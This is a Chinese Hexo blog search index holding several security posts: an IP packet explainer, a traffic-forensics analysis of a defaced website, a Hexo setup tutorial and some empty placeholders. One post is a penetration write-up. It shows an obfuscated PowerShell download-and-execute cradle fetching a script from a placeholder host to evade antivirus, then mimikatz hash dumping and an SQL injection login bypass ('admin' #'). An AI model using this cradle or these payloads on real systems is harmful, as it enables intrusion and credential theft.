<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>数字签名-认证</title>
      <link href="/2020/04/23/shu-zi-qian-ming-ren-zheng/"/>
      <url>/2020/04/23/shu-zi-qian-ming-ren-zheng/</url>
      
        <content type="html"><![CDATA[<h2 id="待更新"><a href="#待更新" class="headerlink" title="待更新~"></a>待更新~</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络传输安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 身份认证 </tag>
            
            <tag> 数字签名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件校验</title>
      <link href="/2020/04/23/wen-jian-xiao-yan/"/>
      <url>/2020/04/23/wen-jian-xiao-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="待更新"><a href="#待更新" class="headerlink" title="待更新~"></a>待更新~</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络传输安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校验 </tag>
            
            <tag> 文件完整性 </tag>
            
            <tag> Md5 </tag>
            
            <tag> Sha </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP pack 详解</title>
      <link href="/2020/04/23/ip-pack-xiang-jie/"/>
      <url>/2020/04/23/ip-pack-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="IP数据包结构详解"><a href="#IP数据包结构详解" class="headerlink" title="IP数据包结构详解"></a>IP数据包结构详解</h2><blockquote><p>如果你想对网络安全了解的更全面，而不是限制于Web层的冰山一角，那么<code>TCP/IP</code>是你必须要精通的！就从IP数据包结构说起吧，先了解最基本的IP数据包张什么样子，才能知道其工作原理与漏洞。</p></blockquote><p>IP报文是在网络层传输的数据单元，也叫IP数据报。IP报文格式如下图：</p><p><img src="1.png" alt=""></p><ul><li>版本：</li></ul><p>IP协议的版本，目前的<code>IPV4</code>,以后会是<code>IPV6</code>。</p><ul><li>首部长度：</li></ul><p>IP报头的长度。固定部分的长度（<code>20字节</code>）和可变部分的长度之和。共占<code>4</code>位。最大为<code>1111</code>，即<code>10进制</code>的<code>15</code>，代表IP报头的最大长度可以为15个<code>32bits</code>（4字节），也就是最长可为<code>15*4=60</code>字节，除去固定部分的长度20字节，可变部分的长度最大为40字节。也就是IP数据包最小为<code>20字节</code>，最大为<code>60字节</code>。</p><ul><li>服务类型：</li></ul><p>这个一般没什么用，因为你就算选了也没效果，只有在<code>QOS</code>或其他特殊情况下才会使用到。</p><ul><li>总长度：</li></ul><p>用来记录IP报文的总长度。报头的长度和数据部分的长度之和。</p><ul><li>标识：</li></ul><p>唯一的标识主机发送的每一分数据报。通常每发送一个报文，它的值加一。当IP报文长度超过传输网络的MTU（最大传输单元）时必须分片，这个标识字段的值被复制到所有数据分片的标识字段中，使得这些分片在达到最终目的地时可以依照标识字段的内容重新组成原先的数据。（说白了就算用来排序的）</p><ul><li>标志：</li></ul><p>共3位。R、DF、MF三位。目前只有后两位有效，<code>DF</code>位：为1表示不分片，为0表示分片。<code>MF</code>：为1表示“还有更多的片”，为0表示这是最后一片。</p><ul><li>片位移：</li></ul><p>本分片在原先数据报文中相对首位的偏移位。（也就是用来IP分片最后排序组合的）</p><ul><li>生存时间：</li></ul><p>IP报文所允许通过的路由器的最大数量。每经过一个路由器，TTL减1，当为0时，路由器将该数据报丢弃。TTL 字段是由发送端初始设置一个 8 bit字段.推荐的初始值由分配数字 <code>RFC</code> 指定，当前值为 64。发送 <code>ICMP</code> 回显应答时经常把 TTL 设为最大值 255。(注意：Linux和Windows不一样)</p><ul><li>协议：</li></ul><p>指出IP报文携带的数据使用的是那种协议，以便目的主机的IP层能知道要将数据报上交到哪个进程（不同的协议有专门不同的进程处理）。和端口号类似，此处采用协议号，<code>TCP</code>的协议号为6，<code>UDP</code>的协议号为17。<code>ICMP</code>的协议号为1，<code>IGMP</code>的协议号为2.</p><ul><li>首部校验和：</li></ul><p>计算IP头部的校验和，检查IP报头的完整性。</p><ul><li>源IP地址：</li></ul><p>这个如果不知道的话，请出门左转，去打游戏吧。</p><ul><li>目的IP地址：</li></ul><p>这个如果不知道的话，请出门右转，<code>影视VIP</code>-<a href="http://qingy.vip/" target="_blank" rel="noopener">传送门</a></p><blockquote><p>以上这个东西很简单吧，只有了解数据包结构，才能了解其工作原理。</p></blockquote><blockquote><p>再此想问大家三个问题：</p></blockquote><p><b>广域网存在各种安全隐患</b></p><p>1、如何避免网上传输的数据有被窃听的风险？<br>              <a href="https://qingy.me/encryption">传送门</a><br>2、如何避免网上传输的数据有被篡改的危险？<br>              <a href="https://qingy.me/wen-jian-xiao-yan/">传送门</a><br>3、如何避免通信双方有被冒充的风险？<br>              <a href="https://qingy.me/shu-zi-qian-ming-ren-zheng/">传送门</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络传输安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据包结构 </tag>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>encryption</title>
      <link href="/2020/04/23/encryption/"/>
      <url>/2020/04/23/encryption/</url>
      
        <content type="html"><![CDATA[<h2 id="待更新"><a href="#待更新" class="headerlink" title="待更新~"></a>待更新~</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络传输安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密算法 </tag>
            
            <tag> 对称加密 </tag>
            
            <tag> 非对称加密 </tag>
            
            <tag> 生日碰撞 </tag>
            
            <tag> AES算法 </tag>
            
            <tag> DES算法 </tag>
            
            <tag> RSA算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次从注入拿到系统权限+内网渗透</title>
      <link href="/2020/04/23/penetration-test/"/>
      <url>/2020/04/23/penetration-test/</url>
      
        <content type="html"><![CDATA[<blockquote><p>call：有人来找我叫我帮他<code>Getshell</code></p></blockquote><p><img src="1.png" alt=""></p><h2 id="1-Getshell"><a href="#1-Getshell" class="headerlink" title="1.Getshell"></a>1.Getshell</h2><p>先登上后台看看先，如图：</p><p><img src="2.png" alt=""></p><p><code>yunsee</code>查看一下<code>iis8.5</code>不存在解析漏洞</p><p><img src="3.png" alt=""></p><p>翻后台找到了一个可以上传html的点，没什么用!<br>后台放弃！</p><p><img src="4.png" alt=""></p><p>扫描目录发现了网站备份源码！去看看敏感文件</p><p><img src="5.png" alt=""></p><p><img src="6.png" alt=""></p><p><code>web.config</code>有账号密码，暂时没用，先留着吧。</p><p>看了一下源码没发现什么地方可以利用，准备放弃了，突然想试试<code>SQL注入</code>。</p><p><img src="7.png" alt=""></p><p>那就上<code>sqlmap —os-shell</code>看看吧。</p><p><img src="8.png" alt=""></p><p>普通的权限，上<code>cs</code>操作!</p><pre class=" language-ps"><code class="language-ps">powershell -w hidden -NoExit "$c1='IEX(New-ObjectNet.WebClient).Downlo';$c2='123(''http://xxxxx/bypass_test.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"</code></pre><p>这段ps代码简单混淆了一下，不加<code>-w hidden</code>可以过杀软。</p><p>我这的<code>bypass_test.ps1</code>经过了免杀了（ps免杀的工具，以前APT组织也有在用）。<br>工具地址在这里：<a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">传送门！</a></p><p><img src="9.png" alt=""></p><h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><p><code>cs</code>上线了，先看看系统补丁,如下图：</p><p><img src="10.png" alt=""></p><p>240个补丁，我吐了，各种<code>exp</code>都没用！</p><p>上<code>msf</code>用<code>local_exploit_suggester</code> 让它扫一下看看有没有可以用的漏洞。</p><p>这里直接用<code>cs</code>可以<code>spwn</code>给<code>msf</code> 先去监听那里新建一个。</p><p><img src="11.png" alt=""></p><p>这里要用<code>foreign</code> 然后<code>host</code>用<code>msf</code>的<code>ip</code>，端口就<code>msf</code>监听的端口 我这边直接监听<code>778</code>。</p><p><img src="12.png" alt=""></p><p>然后去<code>msf choose</code>选择刚刚新建的监听。</p><p><img src="13.png" alt=""></p><p><img src="14.png" alt=""></p><p>可以看到这边<code>msf</code>成功上线，然后用<code>local_exploit_suggester</code>扫描一下</p><p><img src="15.png" alt=""></p><p><img src="16.png" alt=""></p><p>成功返回<code>session，getuid</code>查看一下</p><p><img src="17.png" alt=""></p><h2 id="3-读取密码"><a href="#3-读取密码" class="headerlink" title="3.读取密码"></a>3.读取密码</h2><p>直接<code>SYSTEM</code>，拿下，上<code>mimikatz</code>读取一下密码</p><p><img src="18.png" alt=""></p><p>这里发现读取不到，这里是因为<code>2012 R2</code>以上时</p><p>默认禁止在内存缓存中保存明文密码，但是读到了<code>hash</code></p><p><img src="19.png" alt=""></p><h2 id="4-内网渗透"><a href="#4-内网渗透" class="headerlink" title="4.内网渗透"></a>4.内网渗透</h2><p>本来是不打算接着操作的，但是想着都到这步了，就看看吧，哈哈哈哈哈不碍事，之前看过不存在域先用<code>cs</code>弄<code>socks</code>代理。</p><p><img src="19.png" alt=""></p><p>然后用<code>socksCap64</code>来添加代理。</p><p><img src="21.png" alt=""></p><p>然后当然是测试一下连通性咯<del>O(∩_∩)O</del></p><p><img src="22.png" alt=""></p><p>通了就很棒！查看一下<code>ip</code>然后扫一下内网服务。</p><p><img src="23.png" alt=""></p><p><b>子网掩码是255.255.255.240 那就是172.16.0.1/20</b></p><blockquote><p>没有路由交换基础的请去学习！！！至少学完NP,以后我可能也会更新路由交换和TCP/ip的其他东西，路由交换和TCP是最主要的！</p></blockquote><p>我这里用<code>御剑</code>的端口扫描，线程不能开太高容易死，就扫<code>80</code>端口先(要在刚刚的<code>sockscap64</code>里面添加然后在里面运行才行)</p><p><img src="24.png" alt=""></p><p>扫出来了很多的<code>80</code>，导出来之后用<code>test404</code>的<code>title</code>获取,来获取一下网站的标题再来选目标。</p><p><img src="25.png" alt=""></p><p>看到了一个管理系统，然后去firefox（火狐挺好用的）打开用代理设置一下。</p><p><img src="26.png" alt=""></p><p>设置好之后就可以去访问了。</p><p><img src="27.png" alt=""></p><p>可以看到是个登陆的页面，可以尝试一下弱口令，</p><p><img src="28.png" alt=""></p><p>错误，但是发现了是<code>thinkphp</code>的框架，尝试使用<code>rce</code>。</p><p><img src="29.png" alt=""></p><p><code>rce</code>尝试无果，发现是<code>phpstudy</code>，尝试<code>phpmyadmin</code>发现不存在!</p><p>尝试使用<code>phpstudy rce</code>吧!</p><p><img src="30.png" alt=""></p><p><code>rce</code>无果，尝试<code>注入</code>吧~ε=(´ο｀*)))唉</p><p><img src="31.png" alt=""></p><p>哎嘿嘿~存在<code>注入</code>，尝试万能密码 <code>admin’ #</code></p><p><img src="32.png" alt=""></p><p>直接进来了，后面<code>getshell</code>没法绕过上传，放弃了，内网就到这吧，其他就不弄了~</p><h2 id="最后总结一下吧"><a href="#最后总结一下吧" class="headerlink" title="最后总结一下吧"></a>最后总结一下吧</h2><p>之前提权弄了半天都没弄下来，然后找了位表哥帮忙提权了~</p><p>(其实之前就想到过要用这个扫描，但是懒得传msf，果然就是懒限制了我的操作)</p><p>内网思路的一些分享：注入登录的验证码是可以重复使用的，在不存在注入的情况下，其实可以<code>爆破</code>的。<br>内网渗透发现不存在域就扫一下内网其他机器的常见端口<code>80,445,1433,3306,3389,6379</code>等常见的端口，然后再进行渗透。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Web </tag>
            
            <tag> 渗透入侵 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Getshell </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一篇使用流量回溯分析网站被恶意入侵行为</title>
      <link href="/2020/04/22/ji-yi-pian-shi-yong-liu-liang-hui-su-fen-xi-wang-zhan-bei-e-yi-ru-qin-xing-wei/"/>
      <url>/2020/04/22/ji-yi-pian-shi-yong-liu-liang-hui-su-fen-xi-wang-zhan-bei-e-yi-ru-qin-xing-wei/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>本次流量分析使用国内外（钢化玻璃一样的强力国产）专业流量分析厂商的设备回溯（RSA）-科来</code></p></blockquote><h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1.问题描述"></a>1.问题描述</h2><p>某门户网站多次“<code>被黑”</code>，影响恶劣，由于运维管理人员不了解黑客的攻击手法，因此无法彻底避免这类安全事件发生，只能通过登录被黑服务器查找到被黑页面，并删除相关“黑链”信息等处理方式，这使得运维工作十分被动。</p><p>因此，部署了<code>全流量</code>监控，还原“<code>事故现场</code>”，从而彻底解决这一难题。当事件再一次发生之后，立即对本次安全事件进行针对性的分析工作。</p><h2 id="2-分析过程"><a href="#2-分析过程" class="headerlink" title="2.分析过程"></a>2.分析过程</h2><p>首先，和运维工程师合作，通过登录被黑服务器，删除相关“黑链”信息，及时恢复网站的正常访问，并确定“被黑”时间为10月31日19点12分（服务器时间），进而了解到相关“黑链”是由172.X.X.2为制作服务器并通过FTP上传至被黑服务器，详情如下图所示。</p><p><img src="1.png" alt=""></p><p>通过服务器相关日志提供的IP及时间信息，找到该事件发生时段的流量，下载并回溯分析这段时间内的通讯数据，内容如下图所示。</p><p><img src="2.png" alt=""></p><p>在事发时间段，存在两个可疑点：</p><p>1）制作服务器172.X.X.2与发布服务器172.X.X.3进行过数据通讯，且通信内容就是将“<code>黑链</code>”上传至发布服务器，内容如下图所示。</p><p><img src="3.png" alt=""></p><p>2）制作服务器172.X.X.2还与另外一台服务器172.X.X.33进行了数据通信，且使用的应用是<code>SSH</code>。SSH作为服务后台调试的软件，此时不恰当的出现而引起注意，如下图所示。</p><p><img src="4.png" alt=""></p><p>通过分析发现，172.X.X.33向172.X.X.2发起了后台数据的调试访问，故172.X.X.2并非直接“真凶”，还需要对172.X.X.33的通讯数据进行进一步分析确认。</p><p>172.X.X.33为该网站移动端发布系统的服务器，能够直接与外界的互联网IP进行通讯。通过数据回溯，梳理出事发时间段内该嫌疑主机与其他主机的通讯记录，如下图所示。</p><p><img src="5.png" alt=""></p><p>如上图所示，除了正常来自国内互联网的访问IP，还隐藏着一个来自韩国的IP地址112.X.X.81。网站作为某省的著名门户网站，其主要的访问源都在国内，通常情况下不会有来自境外的访问，故此韩国IP有重大嫌疑。</p><p>对此，我们将172.X.X.33与112.X.X.81的通讯流量进行单独的回溯分析，其流量趋势，如下图所示</p><p><img src="6.png" alt=""></p><p>通过上图可直观的看到，172.X.X.33与112.X.X.81在17点20分至19点30分都存在持续性的流量通讯行为，通过进一步数据挖掘，可以看到172.X.X.33在17点20分对112.X.X.81首先发起了主动外联，并与境外主机建立了心跳检测的链接，如下图所示。</p><p><img src="7.png" alt=""></p><p>由于传统的安全防护设备只对由外至内的通讯流量进行安全监测，而本次连接是由内网IP主动发起，故成功避开了防火墙等安全设备的检测。由此可见，172.X.X.33这台服务器早已被黑客渗透，并被写入了恶意程序。</p><p>在连接建立以后，112.X.X.81开始对172.X.X.33进行远程操作，详情如下图所示。</p><p><img src="8.png" alt=""></p><p>受控主机172.X.X.33主动发起一个对<code>baidu.com</code>的访问请求，而实际地址却指向了境外IP地址112.X.X.81，由此可知，这是一个伪装的网页访问交互过程。本次会话持续时间段为18点48分12秒至19点14分14秒，表明黑客通过对受控主机172.X.X.33进行了长达26分钟的实际操控。</p><h2 id="3-事件复盘"><a href="#3-事件复盘" class="headerlink" title="3.事件复盘"></a>3.事件复盘</h2><p>复盘整个事件需要我们将观察点返回至172.X.X.33、制作服务器172.X.X.2及发布服务器172.X.X.3上，还原整个“犯罪过程”：</p><p>1）经过黑客与受控主机172.X.X.33的相关准备工作后，出于隐匿行踪的考虑，172.X.X.33首先与制作服务器172.X.X.2建立联系，并在18点59分38秒成功登录172.X.X.2的调试后台，并将其作为攻击跳板。</p><p><img src="9.png" alt=""></p><p>2）然后172.X.X.2在18点50分24秒对172.X.X.33进行反向访问，将黑客事先上传至172.X.X.33服务器的压缩文件jxpx10_31.rar进行下载，并解压得到01031_100111.shtml文件</p><p><img src="10.png" alt=""></p><p>3）最后，再由“跳板”172.X.X.2将恶意文件上传至发布服务器172.X.X.3。经过发布服务器后台查询，01031_100111.shtml文件正是被上传至发布服务器的“黑链”文件。</p><p><img src="11.png" alt=""><br><img src="12.png" alt=""></p><h2 id="4-分析结论"><a href="#4-分析结论" class="headerlink" title="4.分析结论"></a>4.分析结论</h2><p>首先攻击者在该网移动端发布系统172.X.X.33上写入恶意程序，并通过其建立与网站的连接。通过该系统制作服务器172.X.X.2下载要发布的“黑链”，并上传给发布服务器172.X.X.3，最终实现了恶意链接的发布。由此可见，整个攻击过程隐蔽性高且经过长期策划，攻击者利用该网站作为门户网站的流量优势，发布恶意“黑链”谋求暴利，极大的损伤了该网站的声誉。</p><blockquote><p>最后说一句，基于现在的网络世界，完整的网络架构建议要部署全流量监控，网络全流量分析是应对安全问题行之有效的手段，因为再高级的攻击都会留下网络痕迹。通过对这些蛛丝马迹的跟踪分析，可以感知并发现未知威胁，复盘攻击手法，从而采取应对措施，及时止损。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web攻击回溯分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科来 </tag>
            
            <tag> colasoft </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> 黑客入侵 </tag>
            
            <tag> Web攻防 </tag>
            
            <tag> 流量监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windown系统hexo+Github搭建教程及模板（小学生都能做出来）！</title>
      <link href="/2020/04/20/article-title/"/>
      <url>/2020/04/20/article-title/</url>
      
        <content type="html"><![CDATA[<h2 id="阅读须知"><a href="#阅读须知" class="headerlink" title="阅读须知"></a>阅读须知</h2><hr><blockquote><p>注意，这篇文章篇幅较长，主要针对新手，每一步很详细，所以可能会显得比较啰嗦，所以建议基础比较好小伙伴根据目录选择自己感兴趣的部分跳着看，不要文章没看，上来先喷一下！谢谢⊙o⊙。<br>教程内容随意复制使用，引用的话请加一个参考链接，谢谢！</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>最近疫情期间真的很无聊，从过年到现在已经休息三个月了，游戏也打腻了，只能做个博客来消磨时间了，花了两天的时间把博客搭的差不多像个样子了，很多小伙伴应该也想过搭建一个自己的博客，网上也有一堆详细的教程。我在此稍稍总结一下具体的搭建步骤，另外网上很少有修改博客源码的个性化教程，我就稍稍分享一下我的一些修改经验，更多的个性化操作需要你自己以后去摸索。</p><p>具体效果可以参观我的博客：<a href="https://qingy.me">qingy.me</a>，欢迎大家支持。</p><p>我不是一个前端程序员，有些东西不是很了解，写的有问题或有改进的地方请大家指出。</p><p>首先要了解一下我们搭建博客要用到的框架。Hexo是高效的静态站点生成框架，它基于Node.js。通过Hexo，你可以直接使用Markdown语法来撰写博客。相信很多小伙伴写工程都写过README.md文件吧，对，就是这个格式的！写完后只需两三条命令即可将生成的网页上传到你的github上，然后别人就可以看到你的网页啦。是不是很简单？你无需关心网页源代码的具体细节，你只需要用心写好你的博客内容就行。</p><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><ul><li>安装Node.js</li><li>添加国内镜像源</li><li>安装Git</li><li>注册Github账户</li><li>安装Hexo</li><li>连接Github与本地</li><li>写文章、发布文章</li><li>绑定域名</li></ul><blockquote><p>个性化的模板和添加分页我就不详细写了，网上有很多，我真的是懒得写~</p></blockquote><hr><p><code>hexo</code>的初步搭建还有部署到<code>Github page</code>上，以及个人域名的绑定</p><h2 id="1-安装Node-js"><a href="#1-安装Node-js" class="headerlink" title="1.安装Node.js"></a>1.安装Node.js</h2><p>首先下载稳定版<a href="https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi" target="_blank" rel="noopener">Node.js</a>,我这里给的是64位的。<br>安装选项全部默认就可以，一路点击  <code>Next</code>。<br>最后安装好之后，按 <code>Win+R</code> 打开命令提示符，输入 <code>node -v</code>和 <code>npm -v</code>来验证是否成功（出现版本号）。</p><h2 id="2-添加国内镜像源"><a href="#2-添加国内镜像源" class="headerlink" title="2.添加国内镜像源"></a>2.添加国内镜像源</h2><p>如果不会科学上网的话（其实很简单的，这里不做讲解，以后可能会更文章），可以使用阿里的国内镜像进行加速。</p><pre class=" language-cpp"><code class="language-cpp">npm config set registry https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>registry<span class="token punctuation">.</span>npm<span class="token punctuation">.</span>taobao<span class="token punctuation">.</span>org</code></pre><h2 id="3-安装Git"><a href="#3-安装Git" class="headerlink" title="3.安装Git"></a>3.安装Git</h2><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">下载地址</a>。</p><p>安装选项还是全部默认，只不过最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>，这样我们就可以直接在命令提示符里打开git了。</p><p>安装完成后在命令提示符中输入<code>git --version</code>验证是否安装成功。</p><h2 id="4-安装Hexo"><a href="#4-安装Hexo" class="headerlink" title="4.安装Hexo"></a>4.安装Hexo</h2><p>在合适的地方新建一个文件夹，用来存放自己的博客文件，比如我的博客文件直接存放在桌面（<code>C:\qingy\desktop\boke</code>）目录下。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开git的控制台窗口，以后我们所有的操作都在git控制台进行，就不要用Windows自带的控制台了。</p><p>打开<code>Git Bash Here</code>后，输入<code>npm i hexo-cli -g</code>安装Hexo。会有几个报错，无视它就行。</p><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>至此<code>hexo</code>就安装完了。</p><p>然后就要初始化我们的网站，输入<code>hexo init</code>初始化文件夹，接着输入<code>npm install</code>安装必备的组件。</p><p>这样本地的网站配置也弄好啦，输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器，然后浏览器打开：<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a>,就可以看到我们的博客初步搭建起来了，效果如下：</p><p><img src="1.png" alt=""></p><p>按<code>ctrl+c</code>关闭本地服务。</p><h2 id="5-注册Github"><a href="#5-注册Github" class="headerlink" title="5.注册Github"></a>5.注册Github</h2><p>接下来就去注册一个github账号，用来存放我们的网站。大多数小伙伴应该都有了吧，作为一个合格的程序猿（媛）还是要有一个的。</p><p>打开<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>，新建一个项目，如下所示：</p><p><img src="2.png" alt=""></p><p>然后如下图所示，输入自己的项目名字，后面一定要加<code>.github.io</code>后缀，<code>README初始化</code>也要勾上。名称一定要和你的github名字完全一样，比如你github名字叫<code>abc</code>，那么仓库名字一定要是<code>abc.github.io</code>,如下图：</p><p><img src="3.png" alt=""></p><h2 id="6-生成SSH链接到GitHub"><a href="#6-生成SSH链接到GitHub" class="headerlink" title="6.生成SSH链接到GitHub"></a>6.生成SSH链接到GitHub</h2><p>生成<code>SSH</code>添加到<code>GitHub</code>，连接<code>Github</code>与本地。<br>右键打开<code>git bash</code>，然后输入下面命令：</p><pre class=" language-cpp"><code class="language-cpp">git config <span class="token operator">--</span>global user<span class="token punctuation">.</span>name <span class="token string">"yourname"</span>git config <span class="token operator">--</span>global user<span class="token punctuation">.</span>email <span class="token string">"youremail"</span></code></pre><p>这里的<code>yourname</code>输入你的<code>GitHub</code>用户名，<code>youremail</code>输入你<code>GitHub</code>的邮箱。这样<code>GitHub</code>才能知道你是不是对应它的账户。</p><p>可以用以下两条，检查一下你有没有输对</p><pre class=" language-cpp"><code class="language-cpp">git config user<span class="token punctuation">.</span>namegit config user<span class="token punctuation">.</span>email</code></pre><p>然后生成密钥SSH key：</p><pre class=" language-cpp"><code class="language-cpp">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa <span class="token operator">-</span>C <span class="token string">"youremail"</span></code></pre><blockquote><p>当输入完以上命令按回车后会有另外的提示，一路按回车就好了。</p></blockquote><blockquote><p><code>ssh</code>，简单来讲就是一个非对称加密方式来实现安全传输，其中，<code>id_rsa</code>是你这台电脑的私人秘钥，不能给别人看的，<code>id_rsa.pub</code>是公共秘钥，可以随便给别人看。把这个公钥放在<code>GitHub</code>上，这样当你链接<code>GitHub</code>自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到<code>GitHub</code>上。</p></blockquote><p>然后打开<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>，在头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个SSH，名字随便起。</p><p>在<code>git bash</code>中输入:</p><pre class=" language-cpp"><code class="language-cpp">cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token punctuation">.</span>pub</code></pre><p>将输出的内容复制到刚刚GitHub的SSH框中，点击确定保存。</p><p>输入<code>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></code>，如果出现你的用户名，那就成功了。</p><h2 id="7-将hexo部署到GitHub"><a href="#7-将hexo部署到GitHub" class="headerlink" title="7.将hexo部署到GitHub"></a>7.将hexo部署到GitHub</h2><p>这一步，我们就可以将<code>hexo</code>和<code>GitHub</code>关联起来，也就是将hexo生成的文章部署到<code>GitHub</code>上，打开博客根目录下的<code>_config.yml</code>文件，这是博客的配置文件，在这里你可以修改与博客配置相关的各种信息。</p><p>修改<code>repository</code>为你的仓库地址：</p><pre class=" language-cpp"><code class="language-cpp">deploy<span class="token operator">:</span>  type<span class="token operator">:</span> git  repository<span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>qingy<span class="token operator">-</span>xyp<span class="token operator">/</span>qingy<span class="token operator">-</span>xyp<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io  branch<span class="token operator">:</span> master</code></pre><p>以上全部完成以后就可以在<code>git bash</code>中<code>hexo g</code>生成静态文章，<code>hexo d</code>进行上传了！</p><blockquote><p>注意第一次部署的时候需要输入你的<code>username</code>和<code>password</code>。</p></blockquote><h2 id="8-写文章、发布文章"><a href="#8-写文章、发布文章" class="headerlink" title="8.写文章、发布文章"></a>8.写文章、发布文章</h2><p>首先在博客根目录下右键打开<code>git bash</code>，安装一个扩展<code>npm i hexo-deployer-git</code>。</p><p>然后输入<code>hexo new post "文章名字"</code>，新建一篇文章。</p><p>然后打开<code>\source_posts</code>的目录，可以发现下面多了一个<code>文件夹</code>和一个<code>.md</code>文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。</p><p>使用<code>markdown</code>语法编写完文件后，根目录下输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>可以本地预览效果，最后输入<code>hexo d</code>上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p><h2 id="9-绑定自己的域名"><a href="#9-绑定自己的域名" class="headerlink" title="9.绑定自己的域名"></a>9.绑定自己的域名</h2><p>现在默认的域名还是<code>xxx.github.io</code>，是不是很没有牌面？大家也都想替换成自己的域名，相信各位都会自己去注册商注册一个属于自己的域名，这里就不详细说明了，只需要在你的注册商官网添加两条<code>DNS</code>解析即可（A类型的<code>IP地址</code>可以通过<code>ping</code>获取，<code>CNAME</code>直接指向<code>yourname.github.io</code>即可)。</p><p>然后打开你的github博客<code>项目</code>，点击<code>settings</code>，拉到下面<code>Custom domain</code>处，填上你自己的域名，保存：</p><p><img src="4.png" alt=""></p><p><img src="5.png" 